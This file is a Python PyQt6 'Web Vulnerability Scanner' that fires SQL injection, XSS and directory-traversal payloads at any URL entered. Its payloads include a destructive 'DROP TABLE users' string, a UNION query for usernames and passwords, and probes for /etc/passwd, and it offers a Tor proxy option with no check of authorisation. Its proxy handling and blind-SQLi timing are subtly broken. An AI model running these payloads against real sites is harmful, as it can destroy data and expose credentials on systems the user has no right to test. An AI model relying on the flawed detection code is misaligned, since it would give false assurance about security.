import sys
import threading
import requests
import re
import json
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
import time
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton,
    QTextEdit, QCheckBox, QFileDialog, QMessageBox
)
from PyQt6.QtGui import QTextCursor, QFont
from PyQt6.QtCore import Qt
from concurrent.futures import ThreadPoolExecutor, as_completed

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# Enable Tor Proxy Support
def enable_tor_proxy():
    return {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}

def fetch_url(url, use_proxy=False, data=None, method="GET", timeout=10, delay=1):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    session = requests.Session()
    if use_proxy:
        session.proxies = enable_tor_proxy()
    try:
        if method == "POST":
            response = session.post(url, headers=headers, data=data, timeout=timeout)
        else:
            response = session.get(url, headers=headers, timeout=timeout)
        response.raise_for_status()
        time.sleep(delay)  # Rate limiting
        return response.text
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None

# SQL Injection Scanner
def check_sqli(url, timeout=10):
    payloads = [
        "' OR 1=1 --",
        "' OR SLEEP(5)--",
        "' OR 'a'='a",
        "1; DROP TABLE users --",
        "' UNION SELECT NULL, username, password FROM users --"
    ]
    for payload in payloads:
        new_url = urljoin(url, "?" + payload)
        response = fetch_url(new_url, timeout=timeout)
        if response and ("sql syntax" in response.lower() or "mysql_fetch" in response.lower()):
            return {"status": "Vulnerable", "details": f"Payload '{payload}' triggered SQL error"}
        # Check POST
        response = fetch_url(url, data={"input": payload}, method="POST", timeout=timeout)
        if response and ("sql syntax" in response.lower() or "mysql_fetch" in response.lower()):
            return {"status": "Vulnerable", "details": f"POST payload '{payload}' triggered SQL error"}
        # Check for time delay (blind SQLi)
        start_time = time.time()
        fetch_url(new_url, timeout=timeout)
        if time.time() - start_time >= 5:
            return {"status": "Vulnerable", "details": f"Time delay detected with payload '{payload}'"}
    return {"status": "Not Vulnerable", "details": "No SQLi detected"}

# XSS Scanner
def check_xss(url, timeout=10):
    payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'';!--\"<XSS>=&{()}"
    ]
    for payload in payloads:
        new_url = urljoin(url, "?q=" + payload)
        response = fetch_url(new_url, timeout=timeout)
        if response and payload in response:
            return {"status": "Vulnerable", "details": f"Payload '{payload}' reflected in response"}
    return {"status": "Not Vulnerable", "details": "No XSS detected"}

# Directory Traversal Scanner
def check_directory_traversal(url, timeout=10):
    common_dirs = ["/etc/passwd", "../../etc/passwd", "../windows/win.ini", "../../../../boot.ini"]
    for dir_path in common_dirs:
        new_url = urljoin(url, dir_path)
        response = fetch_url(new_url, timeout=timeout)
        if response and ("root:x:" in response or "[extensions]" in response):
            return {"status": "Vulnerable", "details": f"Directory traversal with path '{dir_path}'"}
    return {"status": "Not Vulnerable", "details": "No directory traversal detected"}

# CSRF Scanner
def check_csrf(url, timeout=10):
    response = fetch_url(url, timeout=timeout)
    if not response:
        return {"status": "Error", "details": "Failed to fetch page"}
    soup = BeautifulSoup(response, 'html.parser')
    forms = soup.find_all('form')
    if not forms:
        return {"status": "No forms", "details": "No forms found on the page"}
    for form in forms:
        if not form.find('input', {'type': 'hidden', 'name': re.compile('csrf|token|authenticity', re.I)}):
            return {"status": "Vulnerable", "details": "No CSRF token found in form"}
    return {"status": "Not Vulnerable", "details": "CSRF tokens present"}

# Subdomain Enumeration
def enumerate_subdomains(domain, timeout=10):
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    response = fetch_url(url, timeout=timeout)
    subdomains = set()
    if response:
        try:
            data = json.loads(response)
            for entry in data:
                subdomains.add(entry['name_value'])
        except json.JSONDecodeError:
            logging.error("Failed to parse crt.sh JSON response")
    return {"status": "Completed", "details": ", ".join(subdomains) if subdomains else "No subdomains found"}

# Generate HTML Report
def generate_report(results, filename="report.html"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    severity = {
        "SQL Injection": "High",
        "XSS": "Medium",
        "Directory Traversal": "High",
        "CSRF": "Medium",
        "Subdomains": "Info"
    }
    report_html = f"""
    <html>
    <head>
        <title>Web Vulnerability Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 10px; border: 1px solid black; }}
            .vulnerable {{ color: red; }}
            .not-vulnerable {{ color: green; }}
            .info {{ color: blue; }}
        </style>
    </head>
    <body>
        <h2>Web Vulnerability Report</h2>
        <p>Generated on: {timestamp}</p>
        <table>
            <tr><th>Test</th><th>Status</th><th>Details</th><th>Severity</th></tr>
            {''.join(
                f'<tr><td>{key}</td><td class="{"vulnerable" if "Vulnerable" in value["status"] else "not-vulnerable" if "Not Vulnerable" in value["status"] else "info"}">{value["status"]}</td><td>{value["details"]}</td><td>{severity.get(key, "N/A")}</td></tr>'
                for key, value in results.items()
            )}
        </table>
    </body>
    </html>
    """
    with open(filename, "w") as file:
        file.write(report_html)
    logging.info(f"Report saved as {filename}")

class QTextEditLogger(logging.Handler):
    def __init__(self, text_edit):
        super().__init__()
        self.widget = text_edit

    def emit(self, record):
        msg = self.format(record)
        self.widget.append(msg)
        self.widget.moveCursor(QTextCursor.MoveOperation.End)

class VulnerabilityScannerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("Web Vulnerability Scanner")
        self.setGeometry(400, 200, 600, 500)
        self.setStyleSheet("background-color: #1e1e1e; color: white;")

        layout = QVBoxLayout()

        title = QLabel("🔍 Web Vulnerability Scanner")
        title.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter Target URL (e.g., http://example.com)")
        self.url_input.setStyleSheet("background: #2b2b2b; color: white; padding: 5px; border: 1px solid #555;")
        layout.addWidget(self.url_input)

        self.timeout_input = QLineEdit()
        self.timeout_input.setPlaceholderText("Timeout (seconds, default=10)")
        self.timeout_input.setStyleSheet("background: #2b2b2b; color: white; padding: 5px; border: 1px solid #555;")
        layout.addWidget(self.timeout_input)

        self.tor_checkbox = QCheckBox("Use Tor Proxy")
        self.tor_checkbox.setStyleSheet("color: white; font-size: 12px;")
        layout.addWidget(self.tor_checkbox)

        # Checkboxes for tests
        self.sql_checkbox = QCheckBox("Scan for SQL Injection")
        self.xss_checkbox = QCheckBox("Scan for XSS")
        self.traversal_checkbox = QCheckBox("Scan for Directory Traversal")
        self.csrf_checkbox = QCheckBox("Check for CSRF")
        self.subdomain_checkbox = QCheckBox("Enumerate Subdomains")
        
        for checkbox in [self.sql_checkbox, self.xss_checkbox, self.traversal_checkbox, self.csrf_checkbox, self.subdomain_checkbox]:
            checkbox.setStyleSheet("color: white; font-size: 12px;")
            layout.addWidget(checkbox)

        # Buttons
        self.scan_button = QPushButton("Start Scan")
        self.scan_button.setStyleSheet("background-color: #0078D7; color: white; font-size: 14px; padding: 8px;")
        self.scan_button.clicked.connect(self.start_scan)
        layout.addWidget(self.scan_button)

        self.report_button = QPushButton("Generate Report")
        self.report_button.setStyleSheet("background-color: #4CAF50; color: white; font-size: 14px; padding: 8px;")
        self.report_button.clicked.connect(self.generate_report)
        self.report_button.setEnabled(False)
        layout.addWidget(self.report_button)

        # Logging Output Box
        self.output_log = QTextEdit()
        self.output_log.setReadOnly(True)
        self.output_log.setStyleSheet("background: #121212; color: #00FF00; font-size: 12px; padding: 5px; border: 1px solid #555;")
        layout.addWidget(self.output_log)

        self.setLayout(layout)

        # Setup logging to output log
        log_handler = QTextEditLogger(self.output_log)
        log_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        logging.getLogger().addHandler(log_handler)

    def start_scan(self):
        target_url = self.url_input.text().strip()
        if not re.match(r'^https?://', target_url):
            QMessageBox.warning(self, "Input Error", "Please enter a valid URL starting with http:// or https://")
            return

        timeout_str = self.timeout_input.text().strip()
        timeout = 10  # Default
        if timeout_str:
            try:
                timeout = int(timeout_str)
                if timeout <= 0:
                    raise ValueError
            except ValueError:
                QMessageBox.warning(self, "Input Error", "Timeout must be a positive integer")
                return

        use_proxy = self.tor_checkbox.isChecked()

        self.scan_button.setEnabled(False)
        self.report_button.setEnabled(False)
        self.output_log.clear()
        logging.info(f"Starting scan for {target_url} with timeout {timeout}s")

        scan_thread = threading.Thread(target=self.run_scan, args=(target_url, timeout, use_proxy))
        scan_thread.start()

    def run_scan(self, url, timeout, use_proxy):
        tests = []
        if self.sql_checkbox.isChecked():
            tests.append(("SQL Injection", check_sqli, url, timeout))
        if self.xss_checkbox.isChecked():
            tests.append(("XSS", check_xss, url, timeout))
        if self.traversal_checkbox.isChecked():
            tests.append(("Directory Traversal", check_directory_traversal, url, timeout))
        if self.csrf_checkbox.isChecked():
            tests.append(("CSRF", check_csrf, url, timeout))
        if self.subdomain_checkbox.isChecked():
            domain = url.split("://")[-1].split("/")[0]
            tests.append(("Subdomains", enumerate_subdomains, domain, timeout))

        results = {}
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_test = {executor.submit(test[1], test[2], test[3]): test[0] for test in tests}
            for future in as_completed(future_to_test):
                test_name = future_to_test[future]
                try:
                    result = future.result()
                    results[test_name] = result
                    logging.info(f"{test_name} scan completed: {result['status']}")
                except Exception as e:
                    logging.error(f"{test_name} scan failed: {e}")
                    results[test_name] = {"status": "Error", "details": str(e)}

        self.scan_results = results
        self.report_button.setEnabled(True)
        self.scan_button.setEnabled(True)
        logging.info("All scans completed!")

    def generate_report(self):
        if not hasattr(self, "scan_results"):
            QMessageBox.warning(self, "Report Error", "No scan results found. Run a scan first.")
            return

        filename, _ = QFileDialog.getSaveFileName(self, "Save Report", "", "HTML Files (*.html)")
        if filename:
            generate_report(self.scan_results, filename)
            QMessageBox.information(self, "Report Saved", f"Report saved as {filename}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = VulnerabilityScannerGUI()
    window.show()
    sys.exit(app.exec())